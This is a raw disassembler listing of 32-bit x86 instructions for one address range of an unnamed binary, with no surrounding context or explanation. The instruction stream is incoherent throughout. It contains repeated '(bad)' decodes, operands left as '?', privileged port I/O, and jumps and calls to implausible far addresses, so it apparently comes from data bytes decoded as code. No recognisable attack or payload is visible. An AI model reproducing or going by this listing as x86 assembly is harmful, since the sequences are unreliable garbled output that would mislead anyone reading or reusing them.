  4239da:	inc    esp
  4239db:	div    DWORD PTR [edx+0x45]
  4239de:	jge    0x4239d9
  4239e0:	pop    ecx
  4239e1:	or     BYTE PTR [edx-0x74d103eb],cl
  4239e7:	add    DWORD PTR [edx+0x28f22d0e],esp
  4239ed:	add    al,0xf8
  4239ef:	ret    0x271d
  4239f2:	outs   dx,BYTE PTR ds:[esi]
  4239f3:	pop    eax
  4239f4:	loope  0x4239d1
  4239f6:	push   edx
  4239f7:	js     0x42397b
  4239f9:	call   0xf1a70cf0
  4239fe:	leave  
  4239ff:	and    al,0x66
  423a01:	data16 jns 0x423a06
  423a04:	cmc    
  423a05:	and    esi,eax
  423a07:	inc    edi
  423a08:	gs push ebx
  423a0a:	rol    DWORD PTR [esi],cl
  423a0c:	pop    edx
  423a0d:	outs   dx,BYTE PTR ds:[esi]
  423a0e:	sub    DWORD PTR [eax-0x1b],0x4a0aa0e8
  423a15:	push   cs
  423a16:	push   ebp
  423a17:	repnz test al,0x3
  423a1a:	lock ret 0xfbb4
  423a1e:	add    BYTE PTR [eax],al
  423a20:	add    BYTE PTR [eax],al
  423a22:	add    BYTE PTR [edx+ebp*8+0x2755ce6],ah
  423a29:	div    cl
  423a2b:	(bad)  
  423a2c:	push   edi
  423a2d:	icebp  
  423a2e:	call   0x44384093
  423a33:	jne    0x4239be
  423a35:	sub    ecx,DWORD PTR [ecx-0x44]
  423a38:	shl    cl,0x3
  423a3b:	dec    eax
  423a3c:	mov    DWORD PTR ds:0x92fec984,edx
  423a42:	push   eax
  423a43:	mov    ds:0x715d9add,al
  423a48:	fst    st(4)
  423a4a:	aaa    
  423a4b:	fs inc edx
  423a4d:	jmp    0xb1c3ffcc
  423a52:	out    0x6a,eax
  423a54:	rcr    BYTE PTR [ebp+0x31],cl
  423a57:	clc    
  423a58:	inc    edi
  423a59:	lds    edx,FWORD PTR [edi+eax*2-0x3b]
  423a5d:	sub    al,0xe0
  423a5f:	jns    0x423a63
  423a61:	jmp    0x39c869
  423a66:	dec    eax
  423a67:	pusha  
  423a68:	inc    edx
  423a69:	add    dl,al
  423a6b:	test   DWORD PTR gs:[ebp-0x67],eax
  423a6f:	dec    esi
  423a70:	inc    edi
  423a71:	or     BYTE PTR [eax+edi*2],dl
  423a74:	inc    ecx
  423a75:	lea    ebp,[edx*2-0x7b71adce]
  423a7c:	adc    WORD PTR [ecx],bp
  423a7f:	jno    0x423a08
  423a81:	shl    ah,0x2e
  423a84:	xor    bl,bh
  423a86:	fadd   QWORD PTR [eax]
  423a88:	add    BYTE PTR [eax],al
  423a8a:	add    BYTE PTR [eax],al
  423a8c:	dec    edx
  423a8d:	or     al,0x40
  423a8f:	jmp    0xc79dfc53
  423a94:	stc    
  423a95:	fwait
  423a96:	add    al,0xe9
  423a98:	lds    eax,FWORD PTR [ebp-0x5b29514]
  423a9e:	dec    esi
  423a9f:	pop    esp
  423aa0:	mov    ah,0xda
  423aa2:	push   eax
  423aa3:	cli    
  423aa4:	das    
  423aa5:	dec    ebp
  423aa6:	or     WORD PTR [edx],bx
  423aa9:	mul    DWORD PTR [edi-0x25]
  423aac:	mov    dh,0x2
  423aae:	push   eax
  423aaf:	cs xor dl,BYTE PTR fs:[eax]
  423ab3:	test   eax,0x94c08776
  423ab8:	or     BYTE PTR [edi+0x64411145],0x20
  423abf:	sbb    ebx,0xffffffd8
  423ac2:	adc    eax,0x4286b1
  423ac7:	fs mov ecx,0xb6bb0456
  423acd:	in     al,0x4c
  423acf:	pop    esp
  423ad0:	xor    al,0xee
  423ad2:	push   eax
  423ad3:	out    0x45,al
  423ad5:	or     al,bl
  423ad7:	and    al,0xd1
  423ad9:	add    al,BYTE PTR [eax]
  423adb:	jmp    0x25058856
  423ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ae1:	(bad)  
  423ae3:	add    BYTE PTR [eax+eax*1-0x98fea09],cl
  423aea:	aas    
  423aeb:	add    BYTE PTR [ecx],bl
  423aed:	shl    DWORD PTR [ecx+eiz*1+0x0],0x0
  423af2:	add    BYTE PTR [eax],al
  423af4:	add    BYTE PTR [edi+0x31],bl
  423af7:	dec    ebx
  423af8:	lea    ecx,[ecx-0x42]
  423afb:	push   eax
  423afc:	push   ebx
  423afd:	adc    edx,DWORD PTR [ebx-0x8]
  423b00:	jmp    FWORD PTR [ecx+0x60]
  423b03:	adc    BYTE PTR [eax+0x4c],al
  423b06:	add    eax,0x74
  423b09:	pusha  
  423b0a:	in     eax,0x15
  423b0c:	or     al,0x2f
  423b0e:	inc    eax
  423b0f:	add    BYTE PTR [ebp-0x4d05ace4],al
  423b15:	dec    ebp
  423b16:	in     eax,0x75
  423b18:	clc    
  423b19:	shl    edx,cl
  423b1b:	add    edx,DWORD PTR [ebx]
  423b1d:	fdiv   st(7),st
  423b1f:	add    ebx,0x4ba9ee7
  423b25:	or     al,0x33
  423b27:	sub    esp,0xfffffffd
  423b2a:	ss dec ebx
  423b2c:	(bad)  
  423b2d:	(bad)  
  423b2f:	push   eax
  423b30:	push   0x14
  423b32:	cmp    dh,bh
  423b34:	xor    esp,DWORD PTR [edi-0x1c]
  423b37:	adc    eax,0x3ffc48
  423b3c:	test   DWORD PTR [esp+edx*8-0x236b81],ebx
  423b43:	call   DWORD PTR [esi+0x57]
  423b46:	sub    ah,BYTE PTR [eax]
  423b48:	adc    BYTE PTR [eax+eax*1],cl
  423b4b:	lea    eax,[ebp-0x30]
  423b4e:	xor    BYTE PTR [ebx+0x53],cl
  423b51:	test   BYTE PTR [esi],0xf7
  423b54:	jne    0x423b1a
  423b56:	in     eax,0xcf
  423b58:	test   DWORD PTR [eax],eax
  423b5a:	add    BYTE PTR [eax],al
  423b5c:	add    BYTE PTR [eax],al
  423b5e:	or     al,0x6c
  423b60:	push   0xffffffff
  423b62:	test   eax,0x75400ad3
  423b67:	jmp    0x366233ec
  423b6c:	pop    ebp
  423b6d:	xchg   DWORD PTR [eax],esi
  423b6f:	lds    ebp,FWORD PTR [ecx]
  423b71:	mov    edi,0xe84a4909
  423b76:	in     al,0x42
  423b78:	add    al,0x0
  423b7a:	out    dx,al
  423b7b:	cdq    
  423b7c:	sub    edi,ebp
  423b7e:	add    DWORD PTR [eax],ebx
  423b80:	jae    0x423bc7
  423b82:	jno    0x423b9d
  423b84:	in     eax,0x75
  423b86:	imul   ebx,DWORD PTR [ebx],0xf6621956
  423b8c:	jmp    0x423b89
  423b8e:	inc    edx
  423b8f:	outs   dx,BYTE PTR ds:[esi]
  423b90:	les    esi,FWORD PTR [edi+ecx*4+0x5c]
  423b94:	sub    bh,bl
  423b96:	pusha  
  423b97:	std    
  423b98:	adc    eax,DWORD PTR [eax+0x75]
  423b9b:	nop
  423b9c:	shl    BYTE PTR [ebx+ecx*4+0x4f],0x4
  423ba1:	ss ss mov bl,0x17
  423ba5:	or     esp,ebx
  423ba7:	sub    BYTE PTR [eax+edx*2],bh
  423baa:	and    dh,bl
  423bac:	in     al,0x15
  423bae:	test   eax,0x4e003fb9
  423bb3:	sub    BYTE PTR [eax+0x13],dh
  423bb6:	(bad)  
  423bb7:	call   0xe9973bde
  423bbc:	jmp    FWORD PTR [esi+0x71]
  423bbf:	cmp    bh,bh
  423bc1:	out    0x0,al
  423bc3:	add    BYTE PTR [eax],al
  423bc5:	add    BYTE PTR [eax],al
  423bc7:	jg     0x423b87
  423bc9:	jmp    FWORD PTR [edi]
  423bcb:	jne    0x423bb6
  423bcd:	or     edi,edx
  423bcf:	cmc    
  423bd0:	daa    
  423bd1:	add    DWORD PTR [edx-0x33],edx
  423bd4:	outs   dx,DWORD PTR ds:[esi]
  423bd5:	push   esi
  423bd6:	add    BYTE PTR [ebp+0x7b],dh
  423bd9:	in     al,0x75
  423bdb:	int    0xd3
  423bdd:	or     al,BYTE PTR [esi+eiz*2]
  423be0:	test   eax,0x1ef5aff
  423be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423be6:	dec    eax
  423be7:	mov    esp,0x997934be
  423bec:	xor    BYTE PTR [esi+0x5e],ah
  423bef:	mov    eax,ds:0x20cc4101
  423bf4:	inc    edx
  423bf5:	jmp    0xd778a4de
  423bfa:	inc    ebx
  423bfb:	jne    0x423b82
  423bfd:	test   eax,0xa96a556f
  423c02:	jp     0x423c39
  423c04:	add    bh,BYTE PTR [ecx]
  423c06:	in     eax,0x88
  423c08:	stos   BYTE PTR es:[edi],al
  423c09:	test   DWORD PTR [ebx+0x75],0x856fa97f
  423c10:	xchg   DWORD PTR [eax+ebp*8],ebx
  423c13:	les    ebp,FWORD PTR [edx+eax*4-0x1c]
  423c17:	and    eax,0x716ea980
  423c1c:	adc    al,0xa9
  423c1e:	mov    edx,0xe7ec8602
  423c23:	jne    0x423c2e
  423c25:	jl     0x423bea
  423c27:	cmp    al,0xc6
  423c29:	mov    ah,0x78
  423c2b:	add    BYTE PTR [eax],al
  423c2d:	add    BYTE PTR [eax],al
  423c2f:	add    BYTE PTR [ecx],bl
  423c31:	xchg   BYTE PTR [ebp+0x4b],al
  423c34:	(bad)  
  423c35:	adc    eax,0x61273020
  423c3a:	jo     0x423c72
  423c3c:	adc    DWORD PTR [esi],ebx
  423c3e:	and    ebp,DWORD PTR [esi+0x63]
  423c41:	ins    BYTE PTR es:[edi],dx
  423c42:	lods   eax,DWORD PTR ds:[esi]
  423c43:	jbe    0x423bfd
  423c45:	stos   BYTE PTR es:[edi],al
  423c46:	xchg   ebx,eax
  423c47:	push   ebx
  423c48:	(bad)  
  423c49:	out    dx,eax
  423c4a:	mov    eax,0x6602350d
  423c4f:	mov    edi,0x9bacc179
  423c54:	cmp    DWORD PTR [edx],eax
  423c56:	jmp    0x5182245e
  423c5b:	jbe    0x423c9d
  423c5d:	(bad)  
  423c5e:	shr    BYTE PTR [esi+0x7d],0x4e
  423c62:	add    dl,ch
  423c64:	cmp    eax,0x2b5c0847
  423c69:	out    0x4e,al
  423c6b:	cmp    DWORD PTR [esi+0x19370c4f],edx
  423c71:	add    al,BYTE PTR [eax]
  423c73:	jmp    0x379470f2
  423c78:	pusha  
  423c79:	xor    al,0xfb
  423c7b:	fadd   QWORD PTR [esi]
  423c7d:	or     BYTE PTR [eax-0x17],al
  423c80:	std    
  423c81:	ret    0x374
  423c84:	pusha  
  423c85:	dec    edi
  423c86:	adc    BYTE PTR ds:0x74105f81,dh
  423c8c:	mov    esp,0xcc9e50e6
  423c91:	repnz out 0x86,eax
  423c94:	add    BYTE PTR [eax],al
  423c96:	add    BYTE PTR [eax],al
  423c98:	add    cl,dl
  423c9a:	add    al,BYTE PTR [eax]
  423c9c:	and    BYTE PTR [ecx-0x24],0x75
  423ca0:	jns    0x423ca4
  423ca2:	(bad)  
  423ca4:	fidiv  DWORD PTR [esi+0x569ffb02]
  423caa:	dec    edi
  423cab:	in     al,dx
  423cac:	outs   dx,BYTE PTR ds:[esi]
  423cad:	inc    DWORD PTR [eax-0x27dda2bb]
  423cb3:	sub    DWORD PTR cs:[edi+0x76e5becb],esi
  423cba:	das    
  423cbb:	xchg   DWORD PTR ds:0x74f2295f,edi
  423cc1:	mov    esp,0x7ab43906
  423cc6:	dec    edi
  423cc7:	(bad)  
  423cc9:	pushf  
  423cca:	or     ch,BYTE PTR [eax+0x19]
  423ccd:	call   0xdefb3d13
  423cd2:	sbb    al,0x58
  423cd4:	jmp    0xe606964f
  423cd9:	shr    ebp,cl
  423cdb:	cli    
  423cdc:	xchg   esp,eax
  423cdd:	push   0xffffffdd
  423cdf:	jne    0x423ce1
  423ce1:	les    ebp,FWORD PTR [esp+ebx*8-0x77]
  423ce5:	sbb    al,0x5
  423ce7:	push   eax
  423ce8:	call   0x4259a2
  423ced:	dec    edi
  423cee:	retf   0x3b10
  423cf1:	loop   0x423d55
  423cf3:	adc    edi,edi
  423cf5:	inc    ecx
  423cf6:	(bad)  
  423cf7:	add    BYTE PTR [ebp-0x60],0xe3
  423cfb:	jne    0x423d0d
  423cfd:	add    BYTE PTR [eax],al
  423cff:	add    BYTE PTR [eax],al
  423d01:	add    BYTE PTR [ebx-0x7317f3c7],ch
  423d07:	jecxz  0x423d00
  423d09:	dec    ebx
  423d0b:	cmp    DWORD PTR [ebx+ecx*4],ecx
  423d0e:	mov    esp,0x8c6841ec
  423d13:	add    al,0x83
  423d15:	(bad)  
  423d16:	mov    edx,0x5c14ba41
  423d1b:	sbb    eax,DWORD PTR [ebx+0x68e7cfec]
  423d21:	push   edi
  423d22:	aas    
  423d23:	in     eax,0x68
  423d25:	in     al,dx
  423d26:	lds    eax,FWORD PTR [ebx+0x0]
  423d29:	mov    DWORD PTR [ecx-0x4c],ecx
  423d2c:	not    DWORD PTR ds:0x3bce3c
  423d32:	aad    0x4a
  423d34:	hlt    
  423d35:	cmp    esp,DWORD PTR [ebx-0xc]
  423d38:	add    ebp,0x1c
  423d3b:	add    al,0x0
  423d3d:	push   ebx
  423d3e:	loop   0x423cc8
  423d40:	xor    eax,0x441ea8
  423d45:	push   0x4086b4
  423d4a:	in     al,dx
  423d4b:	in     al,0xce
  423d4d:	push   0x40861c
  423d52:	dec    ebx
  423d53:	cmp    dh,ah
  423d55:	mov    esi,DWORD PTR [esp+eiz*8]
  423d58:	into   
  423d59:	mov    DWORD PTR [ecx],edx
  423d5b:	call   0xe0b81c93
  423d60:	or     DWORD PTR [edi+0x36ffe975],0x0
  423d67:	add    BYTE PTR [eax],al
  423d69:	add    BYTE PTR [eax],al
  423d6b:	mov    edx,0x758783d0
  423d70:	jmp    0x57049074
  423d75:	pop    es
  423d76:	lea    esi,[eax]
  423d78:	shr    DWORD PTR [esi],1
  423d7a:	mov    DWORD PTR [eax],esi
  423d7c:	loope  0x423d5f
  423d7e:	iret   
  423d7f:	lock test eax,0x2eedff53
  423d85:	fsub   QWORD PTR [esi+0x31]
  423d88:	daa    
  423d89:	adc    eax,0x87472bc0
  423d8e:	inc    ebp
  423d8f:	mov    DWORD PTR [esi+0x43],esp
  423d92:	cwde   
  423d93:	sub    bh,cl
  423d95:	loopne 0x423dac
  423d97:	and    eax,0xfe003faf
  423d9c:	or     eax,0xe5317f10
  423da1:	xchg   BYTE PTR [ebp-0x3],dh
  423da4:	popa   
  423da5:	pop    ebx
  423da6:	mov    al,ds:0xff53789e
  423dab:	add    DWORD PTR [esi],ecx
  423dad:	loopne 0x423d3c
  423daf:	mov    al,0x75
  423db1:	xor    al,0x8d
  423db3:	mov    eax,0xb0873431
  423db8:	push   ecx
  423db9:	cmp    DWORD PTR [eax+0x2a],edx
  423dbc:	inc    ecx
  423dbd:	std    
  423dbe:	mov    edi,0x3e950
  423dc3:	jne    0x423da3
  423dc5:	(bad)  
  423dc6:	push   DWORD PTR [ebp-0x23]
  423dc9:	das    
  423dca:	push   ebx
  423dcb:	stos   BYTE PTR es:[edi],al
  423dcc:	js     0x423dfc
  423dce:	push   ebx
  423dcf:	add    BYTE PTR [eax],al
  423dd1:	add    BYTE PTR [eax],al
  423dd3:	add    BYTE PTR [edx],cl
  423dd5:	mov    es,WORD PTR [edi]
  423dd7:	sti    
  423dd8:	push   0x753fef71
  423ddd:	pop    esi
  423dde:	les    esi,FWORD PTR [ebx+ecx*4+0x2]
  423de2:	and    dl,BYTE PTR [edi-0x2b]
  423de5:	mov    dl,ah
  423de7:	pop    es
  423de8:	jb     0x423e2c
  423dea:	jmp    0x951905cf
  423def:	mov    edi,0x476eafce
  423df4:	ror    DWORD PTR [eax+0x557cd3a4],1
  423dfa:	icebp  
  423dfb:	push   edi
  423dfc:	ja     0x423dd5
  423dfe:	je     0x423ddb
  423e00:	scas   al,BYTE PTR es:[edi]
  423e01:	sub    al,0xd5
  423e03:	loopne 0x423e25
  423e05:	into   
  423e06:	(bad)  
  423e08:	jmp    0x5e3b:0x3f0428f3
  423e0f:	inc    esi
  423e10:	test   DWORD PTR [esi],esi
  423e12:	mov    al,0xc5
  423e14:	jge    0x423e18
  423e16:	outs   dx,BYTE PTR ds:[esi]
  423e17:	dec    ecx
  423e18:	jns    0x423e49
  423e1a:	pop    esi
  423e1b:	push   ds
  423e1c:	jno    0x423e11
  423e1e:	sub    BYTE PTR [eax+edi*8],al
  423e21:	ret    0x51d
  423e24:	(bad)
  423e27:	mov    WORD PTR [edi+0x7f],?
  423e2a:	test   eax,0x8a465a57
  423e2f:	mov    eax,0xec1af2db
  423e34:	outs   dx,DWORD PTR ds:[esi]
  423e35:	push   0xffffffe9
  423e37:	add    eax,DWORD PTR [eax]
  423e39:	add    BYTE PTR [eax],al
  423e3b:	add    BYTE PTR [eax],al
  423e3d:	sahf   
  423e3e:	rcr    DWORD PTR [ecx*4-0xbdb77b7],0xc2
  423e46:	push   0xf2a0e0e9
  423e4b:	pop    ecx
  423e4c:	push   esi
  423e4d:	jno    0x423e24
  423e4f:	fmul   QWORD PTR [ebx]
  423e51:	xchg   ebx,eax
  423e52:	add    cl,BYTE PTR [edx-0xa]
  423e55:	out    dx,al
  423e56:	lock test al,0x3
  423e59:	lock ret 0xfb5
  423e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e5e:	aad    0x0
  423e60:	fdiv   QWORD PTR [edx+0x5]
  423e63:	inc    eax
  423e64:	jmp    0x12527e6a
  423e69:	jo     0x423e90
  423e6b:	sar    BYTE PTR [eax+edi*4-0x1643fffa],0xe6
  423e73:	cmp    ebp,0xe9fbd527
  423e79:	mov    WORD PTR [ecx],?
  423e7b:	lea    esp,[edx+eiz*4-0x28]
  423e7f:	sti    
  423e80:	test   BYTE PTR [edi-0x6a1e8a27],0xef
  423e87:	(bad)  
  423e88:	std    
  423e89:	add    cl,BYTE PTR ss:[ebp-0x4276a9c]
  423e90:	(bad)  
  423e91:	popa   
  423e92:	xor    ch,BYTE PTR [eax+0x1]
  423e95:	inc    DWORD PTR [edx+0x0]
  423e98:	xchg   BYTE PTR ds:0xe5e9fbd4,al
  423e9e:	(bad)  
  423e9f:	nop
  423ea0:	mov    ch,0x0
  423ea2:	add    BYTE PTR [eax],al
  423ea4:	add    BYTE PTR [eax],al
  423ea6:	call   0x2:0xab20e8d9
  423ead:	push   0x3d
  423eaf:	push   es
  423eb0:	pop    ebx
  423eb1:	aas    
  423eb2:	in     al,dx
  423eb3:	sar    DWORD PTR [edx-0x3],0x5
  423eb7:	jg     0x423e49
  423eb9:	lea    esi,[edx]
  423ebb:	fst    DWORD PTR [eax-0x6f]
  423ebe:	jnp    0x423ec2
  423ec0:	add    cl,ch
  423ec2:	cli    
  423ec3:	shl    DWORD PTR [ebp+ebp*8-0x1a],0x2
  423ec8:	out    0xeb,eax
  423eca:	test   dl,al
  423ecc:	leave  
  423ecd:	sub    edi,DWORD PTR [ebp+0x2]
  423ed0:	push   ebp
  423ed1:	jb     0x423ef8
  423ed3:	sub    esp,0xffffffc5
  423ed6:	ins    DWORD PTR es:[edi],dx
  423ed7:	add    al,BYTE PTR [eax]
  423ed9:	mov    edx,0x85874b
  423ede:	mov    bl,ah
  423ee0:	idiv   edi
  423ee2:	fsubr  QWORD PTR [eax+0x4c]
  423ee5:	mov    cl,ah
  423ee7:	add    al,ch
  423ee9:	daa    
  423eea:	cdq    
  423eeb:	(bad)  
  423eec:	inc    DWORD PTR [ebx-0x107bfa64]
  423ef2:	int3   
  423ef3:	add    BYTE PTR [eax],al
  423ef5:	lea    ecx,[ecx+0x6e]
  423ef8:	cld    
  423ef9:	inc    DWORD PTR [ebx-0x777a72f2]
  423eff:	jecxz  0x423ef8
  423f01:	(bad)  
  423f02:	fdiv   QWORD PTR [ebx+0x4098c815]
  423f08:	add    BYTE PTR [ebp+0x0],cl
  423f0e:	add    BYTE PTR [ecx],bl
  423f10:	outs   dx,BYTE PTR ds:[esi]
  423f11:	cld    
  423f12:	call   DWORD PTR [ebx-0x5b8a08f0]
  423f18:	jno    0x423f5f
  423f1a:	or     BYTE PTR [edx+ebx*1],dh
  423f1d:	add    BYTE PTR [eax-0x64],0x10
  423f21:	call   0x40a9b2
  423f26:	sbb    al,0xd0
  423f29:	jp     0x423f23
  423f2b:	ret    
  423f2c:	add    eax,DWORD PTR [ebx+ebp*4+0x5000005c]
  423f33:	adc    edi,DWORD PTR [ebx]
  423f35:	or     BYTE PTR [ebp-0x29427],cl
  423f3b:	add    edx,DWORD PTR [eax]
  423f3d:	call   0x425ef1
  423f42:	dec    DWORD PTR [ecx+0x8]
  423f45:	sbb    al,0xe4
  423f48:	sbb    eax,0x7c4c005e
  423f4d:	ror    DWORD PTR [edi],cl
  423f4f:	cwde   
  423f50:	xchg   BYTE PTR [eax],al
  423f52:	add    BYTE PTR [ebx+esi*2],bl
  423f55:	test   DWORD PTR [ecx+eax*8+0x7550f7b4],esi
  423f5c:	rcl    DWORD PTR [ebx-0x7a],0xb5
  423f60:	jmp    0xe9b649fb
  423f65:	dec    DWORD PTR [eax+eax*8-0x50426d3]
  423f6c:	inc    ecx
  423f6d:	inc    esp
  423f6e:	push   ebp
  423f6f:	jne    0x423f5a
  423f71:	cmp    al,0x59
  423f73:	add    BYTE PTR [eax],al
  423f75:	add    BYTE PTR [eax],al
  423f77:	add    dh,dh
  423f79:	and    edx,ebx
  423f7b:	jp     0x423fd8
  423f7d:	jno    0x423f82
  423f7f:	add    DWORD PTR [ebp-0x17],esi
  423f82:	nop
  423f83:	test   DWORD PTR [ecx],ecx
  423f85:	pop    es
  423f86:	(bad)  
  423f88:	and    eax,0x35868371
  423f8d:	jmp    0xba5b556c
  423f92:	aas    
  423f93:	add    BYTE PTR ds:0x750101a6,bh
  423f99:	jmp    0x1d5182f2
  423f9e:	adc    ebx,edi
  423fa0:	call   0x2595dfcb
  423fa5:	(bad)  
  423fa6:	repz dec edi
  423fa8:	arpl   WORD PTR [ecx],bp
  423faa:	add    al,0x7f
  423fac:	mov    ecx,0x13c010e5
  423fb1:	bound  eax,QWORD PTR [ebx-0x14]
  423fb4:	retf   0x4336
  423fb7:	mov    esp,0x858b14c5
  423fbc:	or     DWORD PTR [edi+0x5ec5fbdd],ebx
  423fc2:	xor    DWORD PTR [eax+edx*2+0x3250dd84],0x26
  423fca:	mov    al,ds:0xffe97544
  423fcf:	ret    0x81b0
  423fd2:	(bad)  
  423fd3:	push   DWORD PTR [ebp-0x17]
  423fd6:	out    0x8,eax
  423fd8:	sub    BYTE PTR [edx],al
  423fda:	(bad)  
  423fdb:	fld    QWORD PTR [eax]
  423fdd:	add    BYTE PTR [eax],al
  423fdf:	add    BYTE PTR [eax],al
  423fe1:	es mov edx,0xba26c3fe
  423fe7:	ds push cs
  423fe9:	add    BYTE PTR [ebp-0x6b],bh
  423fec:	fisttp WORD PTR [esi]
  423fee:	rcr    DWORD PTR [ecx+0x3a0901eb],cl
  423ff4:	fisttp QWORD PTR [ebx-0x3e]
  423ff7:	xchg   edx,eax
  423ff8:	cmp    BYTE PTR [edi+edi*4+0x684603e5],bh
  423fff:	and    bl,ch
  424001:	addr16 out dx,al
  424003:	sbb    edi,esi
  424005:	jle    0x423ff6
  424007:	test   al,0x3
  424009:	cli    
  42400a:	cmp    edi,ecx
  42400c:	mov    BYTE PTR ds:0x7503e80a,cl
  424012:	xchg   DWORD PTR [ebp+0x61896d27],ebp
  424018:	adc    BYTE PTR [edx+eax*1-0x17],dh
  42401c:	mov    BYTE PTR [edi],dh
  42401e:	repnz dec edx
  424020:	mov    DWORD PTR [ecx],esi
  424022:	push   ds
  424023:	in     eax,dx
  424024:	mov    bh,ch
  424026:	or     eax,ebp
  424028:	add    esi,DWORD PTR [ebp-0x79]
  42402b:	and    esi,esp
  42402d:	adc    al,0x89
  42402f:	jno    0x424024
  424031:	jne    0x424035
  424033:	jmp    0xb2304814
  424038:	idiv   BYTE PTR [edx-0xb]
  42403b:	sub    BYTE PTR [esi+eax*8],al
  42403e:	sar    esp,1
  424040:	jecxz  0x423fcb
  424042:	inc    edx
  424043:	jmp    0x4240ce
  424048:	add    BYTE PTR [eax],al
  42404a:	xor    eax,0xa230f357
  42404f:	ret    0x6c39
  424052:	pusha  
  424053:	add    al,0xe9
  424055:	add    esp,DWORD PTR [esi-0x6ad7daf6]
  42405b:	push   esi
  42405c:	add    cl,ah
  42405e:	push   ecx
  42405f:	clc    
  424060:	jmp    0x42403c
  424062:	mov    dh,0x2
  424064:	out    0xef,eax
  424066:	inc    ecx
  424067:	clc    
  424068:	out    0xf5,eax
  42406a:	mov    dh,0x2
  42406c:	xchg   DWORD PTR [esi],ebp
  42406e:	push   ecx
  42406f:	nop
  424070:	or     al,0xe9
  424072:	inc    ebx
  424073:	mov    esp,ebp
  424075:	push   0x12
  424077:	out    dx,eax
  424078:	dec    esi
  424079:	xchg   edi,eax
  42407a:	inc    ecx
  42407b:	mov    esi,ebp
  42407d:	ret    
  42407e:	ror    ebp,1
  424080:	jb     0x424057
  424082:	std    
  424083:	stos   BYTE PTR es:[edi],al
  424084:	xchg   DWORD PTR [eax],esp
  424086:	shl    edi,0x1b
  424089:	cli    
  42408a:	add    al,BYTE PTR ss:[edi-0x77773951]
  424091:	loope  0x42410a
  424093:	add    al,BYTE PTR [eax]
  424095:	imul   cl
  424097:	adc    BYTE PTR [eax],0xe8
  42409a:	jbe    0x42409e
  42409c:	sti    
  42409d:	jg     0x424049
  42409f:	jp     0x4240ee
  4240a1:	in     eax,dx
  4240a2:	cld    
  4240a3:	inc    edi
  4240a4:	clc    
  4240a5:	out    0xa4,al
  4240a7:	or     DWORD PTR [edi],ecx
  4240a9:	sub    DWORD PTR [ecx+0x7f],esi
  4240ac:	inc    ebp
  4240ad:	rol    DWORD PTR [eax],0x0
  4240b0:	add    BYTE PTR [eax],al
  4240b2:	add    BYTE PTR [ecx-0x33],cl
  4240b5:	jne    0x424084
  4240b7:	scas   al,BYTE PTR es:[edi]
  4240b8:	neg    edi
  4240ba:	fidiv  DWORD PTR [esi]
  4240bc:	add    al,BYTE PTR [ebp-0x35799157]
  4240c2:	jmp    0x6aa4433d
  4240c7:	int3   
  4240c8:	retf   0x1bfe
  4240cb:	pop    esp
  4240cc:	mov    BYTE PTR [edx-0x7],dh
  4240cf:	mov    ecx,DWORD PTR [eax+eax*1+0x270276e8]
  4240d6:	outs   dx,DWORD PTR ds:[esi]
  4240d7:	jne    0x4240dc
  4240d9:	add    BYTE PTR [eax],al
  4240db:	dec    esp
  4240dc:	push   es
  4240dd:	jge    0x4240c7
  4240df:	dec    ebp
  4240e0:	or     ch,ah
  4240e2:	add    DWORD PTR [ecx],ebp
  4240e4:	mov    ch,0x1
  4240e6:	pop    ebp
  4240e7:	mov    al,ds:0x30f46e1
  4240ec:	inc    ebx
  4240ed:	clc    
  4240ee:	adc    DWORD PTR [ebx+edi*8-0x2dcfe38a],0x43
  4240f6:	dec    eax
  4240f7:	and    dh,dl
  4240f9:	inc    ebx
  4240fa:	dec    eax
  4240fb:	shl    BYTE PTR [ebx+edi*2],0xe8
  4240ff:	adc    al,BYTE PTR [ecx+0x1e]
  424102:	dec    eax
  424103:	xor    al,dl
  424105:	inc    ebx
  424106:	jne    0x4240f4
  424108:	fbld   TBYTE PTR [ebx]
  42410a:	mov    DWORD PTR [ecx],ebx
  42410c:	fucom  st(3)
  42410e:	es dec edi
  424110:	fiadd  WORD PTR [esi]
  424112:	je     0x4240de
  424114:	cmp    al,0x74
  424116:	push   ss
  424117:	add    BYTE PTR [eax],al
  424119:	add    BYTE PTR [eax],al
  42411b:	add    BYTE PTR [ecx+eax*2],dl
  42411e:	add    ecx,DWORD PTR [eax+0x41]
  424121:	ror    BYTE PTR [eax+0x7d7dc05d],1
  424127:	lock ja 0x424103
  42412a:	mov    BYTE PTR [ebp-0x60],bl
  42412d:	jge    0x4241ac
  42412f:	call   0x5dcb40fb
  424134:	rcr    bh,0xfe
  424137:	mov    BYTE PTR [ecx],ch
  424139:	mov    dh,0x89
  42413b:	pop    ebp
  42413c:	enter  0x4579,0xe8
  424140:	pop    esp
  424141:	lods   eax,DWORD PTR ds:[esi]
  424142:	adc    eax,0x44a0f8
  424147:	test   DWORD PTR [ebx+esi*1],ebx
  42414a:	inc    esi
  42414b:	push   0x2c
  42414d:	lods   eax,DWORD PTR ds:[esi]
  42414e:	jne    0x42414c
  424150:	sbb    edx,ebx
  424152:	pop    es
  424153:	adc    eax,0xa9068c
  424158:	jne    0x424133
  42415a:	(bad)  
  42415b:	aas    
  42415c:	rcl    ecx,0x6d
  42415f:	(bad)  
  424160:	icebp  
  424161:	push   ds
  424162:	in     al,dx
  424163:	push   eax
  424164:	cmp    dl,bh
  424166:	sar    ebx,cl
  424168:	mov    BYTE PTR [ecx-0xe],cl
  42416b:	aas    
  42416c:	jne    0x424157
  42416e:	imul   eax,DWORD PTR [eax],0x14e3cf22
  424174:	mov    ch,0xd9
  424176:	mov    al,BYTE PTR [ebp+0x9]
  424179:	add    eax,0xad9dec41
  42417e:	bound  eax,QWORD PTR [eax]
  424180:	add    BYTE PTR [eax],al
  424182:	add    BYTE PTR [eax],al
  424184:	add    BYTE PTR [ebp+0x69],dh
  424187:	mov    al,BYTE PTR [ebp+0x5]
  42418a:	cmc    
  42418b:	inc    eax
  42418c:	call   0xec9259d6
  424191:	jmp    0x5028:0x7566e796
  424198:	cld    
  424199:	fcmovbe st,st(6)
  42419b:	mov    bh,0x14
  42419d:	xor    eax,0x2e5a36d9
  4241a2:	and    al,dl
  4241a4:	push   ebp
  4241a5:	out    dx,al
  4241a6:	cmc    
  4241a7:	xor    eax,DWORD PTR [edi-0x5ed722d0]
  4241ad:	jne    0x424188
  4241af:	dec    DWORD PTR [esi+0x42]
  4241b2:	push   ebp
  4241b3:	dec    eax
  4241b4:	data16 jbe 0x4241f9
  4241b7:	sub    eax,0x2cee21c1
  4241bc:	ror    DWORD PTR [ecx],0xe9
